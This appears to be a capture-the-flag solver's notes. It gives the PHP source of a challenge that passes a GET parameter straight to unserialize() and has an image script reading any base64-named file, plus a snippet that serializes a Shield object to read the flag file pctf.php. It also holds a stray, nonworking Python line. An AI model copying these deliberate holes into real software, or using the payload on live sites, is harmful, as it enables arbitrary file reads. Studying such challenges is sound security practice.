#! /usr/bin/env python2
#  -*- coding: utf-8 -*-
#  author:boo

# print('\a')
print(hex('锟斤拷'))
exit

index
<?php
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}

		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
	$a = new Shield("pctf.php");
	echo serialize($a);
?>

show
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		readfile($f)
		// if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		// && stripos($f,'pctf')===FALSE) {
		// 	readfile($f);
		// } else {
		// 	echo "File not found!";
		// }
	}
?>



